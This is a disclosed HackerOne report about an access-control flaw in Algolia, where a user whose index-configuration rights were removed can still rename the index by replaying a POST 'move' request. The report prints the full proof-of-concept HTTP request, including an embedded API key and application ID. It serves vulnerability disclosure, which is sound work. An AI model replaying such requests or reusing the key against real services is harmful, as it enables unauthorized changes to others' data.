---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '99969'
original_report_id: '99969'
title: User with limited access to Index configuration can rename the Index
weakness: Improper Authentication - Generic
team_handle: algolia
created_at: '2015-11-16T15:17:26.720Z'
disclosed_at: '2016-06-01T10:16:55.411Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- improper-authentication-generic
---

# User with limited access to Index configuration can rename the Index

## Metadata

- HackerOne Report ID: 99969
- Weakness: Improper Authentication - Generic
- Program: algolia
- Disclosed At: 2016-06-01T10:16:55.411Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

HI,

I just noticed that user with limited access to any index can still rename it by replaying the old request after changing some values in the post request.

Steps:
1. Invite user to your application.
2. Give User full access.
3. Now login the invited account, and create an index.
4. Go back to admin account and remove the access to configure index.
5. On Invited account, all index configuration options will disappear.
6. Post the following request.

POST /1/indexes/<index name>/operation?x-algolia-api-key=395d4963afcdba0c00f4e8847459a8fd&x-algolia-application-id=JC6IO59O0A&x-algolia-agent=Algolia%20for%20vanilla%20JavaScript%203.7.5 HTTP/1.1
Host: c1-in-2.algolianet.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://www.algolia.com/explorer
Content-Length: 39
Origin: https://www.algolia.com
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

{"operation":"move","destination":"put index name here"}

7. Now reload the page, U'll notice the index will be having new name.

I guess,  other changes can also be made like deleting or adding objects to this index.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
